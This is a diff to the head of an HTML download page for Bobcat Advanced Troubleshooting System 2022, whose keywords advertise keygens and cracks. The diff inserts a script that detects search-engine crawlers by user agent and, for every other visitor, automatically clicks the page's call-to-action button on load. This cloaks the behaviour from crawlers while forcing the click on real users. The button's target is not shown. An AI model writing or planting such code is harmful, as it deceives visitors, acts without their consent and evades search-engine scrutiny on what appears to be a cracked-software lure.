@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bobcat Advanced Troubleshooting System (BATS) 2022 (version 2.4)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Bobcat Advanced Troubleshooting System 2022 (version 2.4) for service, maintenance, and operator manuals. Available in English.">
     <meta name="keywords" content="Bobcat Advanced Troubleshooting System 2022, Bobcat Advanced Troubleshooting System version 2.4, Bobcat Advanced Troubleshooting System 2022 download, Bobcat Advanced Troubleshooting System 2022 free download, Bobcat Advanced Troubleshooting System 2022 keygen, Bobcat Advanced Troubleshooting System crack, Bobcat BATS 2022, Bobcat BATS version 2.4, Bobcat BATS downloads, Bobcat BATS free download, Bobcat BATS keygen, Bobcat BATS crack, Bobcat troubleshooting software, Bobcat maintenance manual 2022, Bobcat service manual, Bobcat operator manual, Bobcat diagrams 2022, Bobcat machinery software, Bobcat excavators manual, Bobcat loader manual, Bobcat troubleshooting 2022, Бобкат система диагностики 2022, Бобкат система диагностики скачать, Бобкат обслуживание техника, Бобкат сервисный мануал, Бобкат операторский мануал, Бобкат техническая документация, Бобкат руководство по обслуживанию, Бобкат схемы 2022, Бобкат программное обеспечение 2022, Система диагностики и устранения неисправностей Бобкат">
     <style>
